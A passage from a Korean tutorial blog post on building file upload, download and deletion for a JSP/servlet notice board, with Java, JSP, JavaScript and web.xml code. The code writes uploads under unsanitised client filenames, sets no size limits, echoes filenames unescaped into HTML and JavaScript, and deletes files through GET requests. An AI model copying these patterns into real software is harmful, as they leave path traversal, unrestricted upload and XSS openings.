<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="nl">part:</span><span class="n">parts</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">part</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"Content-Disposition"</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="s">"filename="</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">continue</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">continue</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">uploadPath</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 폴더 생성</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">file</span><span class="o">.</span><span class="na">mkdir</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">noticeSid</span><span class="o">+</span><span class="s">"게시글 폴더 생성 함"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">count</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="na">listFiles</span><span class="o">().</span><span class="na">length</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="no">MAX_FILE_NUM</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"최대 파일 갯수 초과"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"퐅더 존재? =&gt; "</span><span class="o">+</span><span class="n">file</span><span class="o">.</span><span class="na">isDirectory</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"타입 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"Content-Disposition"</span><span class="o">));</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"크기 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSize</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"이름 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span><span class="n">part</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">uploadPath</span><span class="o">+</span><span class="nc">File</span><span class="o">.</span><span class="na">separator</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">part</span><span class="o">.</span><span class="na">delete</span><span class="o">();</span> <span class="c1">// 임시파일 삭제</span>
  
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"업로드 성공"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"file upload success"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"경로 : "</span><span class="o">+</span><span class="n">uploadPath</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"파일 업로드 실패"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"file upload fail"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// ***** 파일 업로드 end *****</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span> <span class="o">=</span> <span class="s">"&lt;script&gt;alert('success "</span><span class="o">+</span><span class="n">noticeRe</span><span class="o">+</span><span class="s">"');location.href='"</span><span class="o">+</span><span class="n">noticeBoard</span><span class="o">+</span><span class="s">"?page=1&amp;q='&lt;/script&gt;"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
</code></pre></div></div>

<h4 id="webxml">web.xml</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">request.getParts()</code> 를 사용하기 위해서는 임시저장 폴더를 만들어 줘야 한다.</li>
  <li><code class="language-plaintext highlighter-rouge">file-size-threshold</code> 에 설정한 용량이 넘으면 임시저장 폴더에 저장한다는 것이다.</li>
  <li>코드에서 실제 파일이 어디에 저장될 것인지 코딩해 줘야한다.</li>
</ul>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;servlet&gt;</span>
	<span class="nt">&lt;servlet-name&gt;</span>mainpage<span class="nt">&lt;/servlet-name&gt;</span>
	<span class="nt">&lt;servlet-class&gt;</span>com.mingyu2.happyhackingmain.MainPage<span class="nt">&lt;/servlet-class&gt;</span>
	<span class="nt">&lt;multipart-config&gt;</span>
		<span class="nt">&lt;location&gt;</span>/home/mq/temp<span class="nt">&lt;/location&gt;</span>
		<span class="nt">&lt;max-file-size&gt;</span>-1<span class="nt">&lt;/max-file-size&gt;</span>
		<span class="nt">&lt;max-request-size&gt;</span>-1<span class="nt">&lt;/max-request-size&gt;</span>
		<span class="nt">&lt;file-size-threshold&gt;</span>1024<span class="nt">&lt;/file-size-threshold&gt;</span>
	<span class="nt">&lt;/multipart-config&gt;</span>
<span class="nt">&lt;/servlet&gt;</span>
</code></pre></div></div>

<p><br /></p>

<h3 id="게시글-수정-및-저장--파일-삭제">게시글 수정 및 저장 &amp; 파일 삭제</h3>

<h4 id="jsp-1">JSP</h4>
<h5 id="설명-2">설명</h5>
<ul>
  <li>게시글 수정 상태에서 첨부파일을 다운 받을 수 있는 링크를 추가하였다.</li>
  <li>첨부파일 삭제 버튼을 추가하였다. 삭제 버튼을 누르면 첨부파일이 바로 삭제된다.</li>
  <li><code class="language-plaintext highlighter-rouge">fetch</code>를 이용하여 get 전송을 통해 첨부파일을 삭제하여 준다.</li>
  <li>새로운 첨부파일을 추가하고 저장버튼을 누르면 파일은 서버에 저장된다. 하지만 한 게시글 당 파일은 최대 3개까지 저장이 가능하다.</li>
  <li>수정 모드 이면서 첨부 파일이 있으면 첨부파일 링크 및 파일 삭제버튼이 나타난다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3c80844f-6245-48e1-b5e6-67e6e381e8fb" alt="Pasted image 20230524235849" /></li>
</ul>

<h5 id="과정-2">과정</h5>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyImOyglSDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IOyImOyglSDtjpjsnbTsp4Ag66CM642U66eBXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOyImOyglSDtjpjsnbTsp4Ag7J2R64u1XG7sgqzsmqnsnpAgLT4-IOyCrOyaqeyekCA6IOygnOuqqSwg67O466y4IOyImOyglVxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiDssqjrtoDtjIzsnbwg7IKt7KCcIOuYkOuKlCDstpTqsIBcbuyCrOyaqeyekCAtPj4g7ISc67KEIDog7IiY7KCVIOqyjOyLnOq4gCDsoIDsnqUg7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IOyImOyglSDqsozsi5zquIAg7KCA7J6lICsg7YyM7J28IOyggOyepVxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zrrLwg7KCA7J6lIOuYkOuKlCDsi6TtjKgg7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>

<ol>
  <li>자신이 쓴 게시글에서 수정 버튼을 클릭하여 게시글 수정 페이지로 들어간다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/659e3e4d-aef1-40c9-83e1-c5230cd25e03" alt="Pasted image 20230524235819" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/39ba0683-e00e-4e9a-8db9-347b2651e6f1" alt="Pasted image 20230524235849" /></li>
  <li>수정 페이지에서 제목과 본문을 변경할 수 있다.</li>
  <li>전에 올렸던 첨부파일 확인이 가능하다. 그리고 이 첨부파일을 삭제버튼을 통해 삭제도 가능하다.</li>
  <li>새로운 파일을 추가할 수 있는 <code class="language-plaintext highlighter-rouge">파일 버튼</code>도 존재한다.</li>
  <li>수정이 완료되면 <code class="language-plaintext highlighter-rouge">저장</code> 버튼을 눌러준다.</li>
  <li>만약 파일 첨부개수가 3개가 넘으면 새로운 파일은 추가되지 않는다. 하지만 변화된 게시글은 저장이 된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2ded71de-a9a2-42d8-bcc0-8605b0a8b859" alt="Pasted image 20230525000056" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4fbff20a-ec82-458b-9ca5-41ad8979e61a" alt="Pasted image 20230525000111" /></li>
</ol>

<h5 id="첨부파일-삭제-과정">첨부파일 삭제 과정</h5>
<ol>
  <li>첨부파일의 삭제 버튼을 눌러준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/607e0b3e-2009-4f79-a75f-5b41d73aed89" alt="Pasted image 20230525003215" /></li>
  <li>javacript 코드의 fetch를 통해 첨부파일 삭제 get 요청이 보내진다.</li>
  <li>첨부파일이 서버에서 정상적으로 삭제가 되면 json 형태로 <code class="language-plaintext highlighter-rouge">success</code> 응답을 받는다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9c5fa8bf-e0cd-4283-99fb-7e266693af5b" alt="Pasted image 20230525003139" /></li>
  <li>성공적으로 삭제가 되면 첨부파일 링크를 테이블에서 삭제한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f06bdc2a-9285-4daa-9f03-263404290099" alt="Pasted image 20230525003233" /></li>
</ol>

<h5 id="코드--notice_writejsp--1">코드 ( notice_write.jsp )</h5>

<ul>
  <li>servlet 에서 파일이름 목록과 모드 정보를 받아온다.</li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"com.mingyu2.happyhackingmain.Pair"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"java.util.ArrayList"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%</span>
<span class="kt">var</span> <span class="n">mode</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Boolean</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"modifyMode"</span><span class="o">);</span>
<span class="k">if</span><span class="o">(</span><span class="n">mode</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">mode</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
<span class="o">}</span>
<span class="kt">var</span> <span class="n">fileNameList</span> <span class="o">=</span> <span class="o">(</span><span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Pair</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="err">&gt;&gt;</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"fileNameList"</span><span class="o">);</span>
<span class="nt">%&gt;</span>
</code></pre></div></div>
<p><br /></p>
<ul>
  <li>수정 모드 &amp; 첨부파일이 하나 이상이면 다운 링크 및 삭제 버튼을 표시해 준다.</li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">mode</span> <span class="o">&amp;&amp;</span> <span class="n">fileNameList</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="err">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%</span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="n">file</span> <span class="o">:</span> <span class="n">fileNameList</span> <span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
    <span class="nt">&lt;tr</span> <span class="na">id=</span><span class="s">'</span><span class="nt">&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD1</span><span class="o">()</span> <span class="nt">%&gt;</span><span class="s">'</span><span class="nt">&gt;</span>    
    <span class="nt">&lt;td</span> <span class="na">colspan=</span><span class="s">"2"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"${noticeBoardFileDownload}?downlink=</span><span class="nt">&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD2</span><span class="o">()</span> <span class="nt">%&gt;</span><span class="s">"</span><span class="nt">&gt;&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD1</span><span class="o">()</span> <span class="nt">%&gt;&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:delete_file('</span><span class="nt">&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD1</span><span class="o">()</span> <span class="nt">%&gt;</span><span class="s">')"</span><span class="nt">&gt;</span>delete<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
<span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%</span> <span class="o">}</span><span class="nt">%&gt;</span>
<span class="nt">&lt;tr&gt;</span>
<span class="nt">&lt;td</span> <span class="na">colspan=</span><span class="s">"2"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"UPLOAD_FILE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/td&gt;</span>
<span class="nt">&lt;/tr&gt;</span>
</code></pre></div></div>

<p><br /></p>
<ul>
  <li>첨부파일 삭제 버튼을 누르면 <code class="language-plaintext highlighter-rouge">delete_file</code> 함수가 동작한다.</li>
  <li>파라미터로 첨부파일 이름을 가져온다.</li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">mode</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">fileNameList</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="err">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">function</span> <span class="nf">delete_file</span><span class="p">(</span><span class="nx">name</span><span class="p">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">${noticeBoardFileDelete}?noticeID=${noticeID}&amp;filename=</span><span class="dl">"</span><span class="o">+</span><span class="nx">name</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">var</span> <span class="nx">re</span> <span class="o">=</span> <span class="nf">confirm</span><span class="p">(</span><span class="dl">"</span><span class="s2">삭제 하시겠습니까?</span><span class="dl">"</span><span class="p">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">if</span><span class="p">(</span><span class="o">!</span><span class="nx">re</span><span class="p">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span><span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">json</span><span class="p">())</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">json</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">json</span><span class="p">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">var</span> <span class="nx">re</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">j</span><span class="p">).</span><span class="nx">result</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">if</span><span class="p">(</span><span class="nx">re</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">success</span><span class="dl">"</span><span class="p">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">var</span> <span class="nx">table</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">"</span><span class="s2">notice_write</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">table</span><span class="p">.</span><span class="nx">rows</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">if</span><span class="p">(</span><span class="nx">table</span><span class="p">.</span><span class="nx">rows</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">id</span> <span class="o">==</span> <span class="nx">name</span><span class="p">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nx">table</span><span class="p">.</span><span class="nf">deleteRow</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">파일 삭제 성공</span><span class="dl">"</span><span class="p">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">파일 삭제 실패</span><span class="dl">"</span><span class="p">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
